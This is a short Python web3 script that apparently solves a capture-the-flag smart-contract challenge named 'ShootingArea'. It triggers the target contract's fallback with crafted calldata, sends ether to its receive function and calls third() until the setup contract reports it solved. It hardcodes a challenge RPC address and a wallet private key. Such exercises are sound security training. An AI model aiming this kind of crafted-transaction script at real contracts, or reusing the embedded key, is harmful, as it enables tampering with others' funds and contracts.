from web3 import Web3, AsyncWeb3
w3 = Web3(Web3.HTTPProvider('http://139.59.173.68:31577/'))
#print(w3)
#print(w3.eth.get_block('latest'))
target_address = "0x0B59D292651a91D740D0be04C330261336355951"
setup_address = "0x30f0f012efDD7fb7ec8C171a66f5Ecea0eD835a9"
wallet_address = "0xA631B47E8fC8D5e58cdc7EFc3Bb999135df75e47"
private_key = "0x187ce616262c531702591319c8e3ae3c1668b93910d38a6853dbcef42c4fffd9"

shooting_abi = [
{
"stateMutability": "payable",
"type": "fallback"
},
{
"inputs": [],
"name": "firstShot",
"outputs": [
{
"internalType": "bool",
"name": "",
"type": "bool"
}
],
"stateMutability": "view",
"type": "function"
},
{
"inputs": [],
"name": "secondShot",
"outputs": [
{
"internalType": "bool",
"name": "",
"type": "bool"
}
],
"stateMutability": "view",
"type": "function"
},

{
"inputs": [],
"name": "third",
"outputs": [],
"stateMutability": "nonpayable",
"type": "function"
},
{
"inputs": [],
"name": "thirdShot",
"outputs": [
{
"internalType": "bool",
"name": "",
"type": "bool"
}
],
"stateMutability": "view",
"type": "function"
},
{
"stateMutability": "payable",
"type": "receive"
}
]

setup_abi = [
{
"inputs": [],
"stateMutability": "nonpayable",
"type": "constructor"
},
{
"inputs": [],
"name": "TARGET",
"outputs": [
{
"internalType": "contract ShootingArea",
"name": "",
"type": "address"
}
],
"stateMutability": "view",

"type": "function"
},
{
"inputs": [],
"name": "isSolved",
"outputs": [
{
"internalType": "bool",
"name": "",
"type": "bool"
}
],
"stateMutability": "view",
"type": "function"
}
]

target_contract_address = w3.eth.contract(address = target_address, abi = shooting_abi)
setup_contract_instance = w3.eth.contract(address = setup_address, abi = setup_abi)

#The above is common to all blockchain challenges.  Below is specific to this challenge.

# └─$ cat Setup.sol
#    function isSolved() public view returns (bool) {
#        return TARGET.firstShot() && TARGET.secondShot() && TARGET.thirdShot();    }

# └─$ cat ShootingArea.sol

#Modifiers 


#fallback
w3.eth.send_transaction({'to': target_address, 'from': wallet_address, 'data': "0x61455567"})

#recieve
nonce = w3.eth.get_transaction_count(wallet_address)

tx = {'nonce': nonce, 'to': target_address, 'value': w3.to_wei(1, 'ether'), 'gas': 2000000,
'gasPrice': w3.to_wei('50', 'gwei')}

signed_tx = w3.eth.account.sign_transaction(tx, private_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
#print(w3.to_hex(tx_hash))

#transact
target_contract_address.functions.third().transact()

#Get flag
setup_contract_instance.functions.isSolved().call()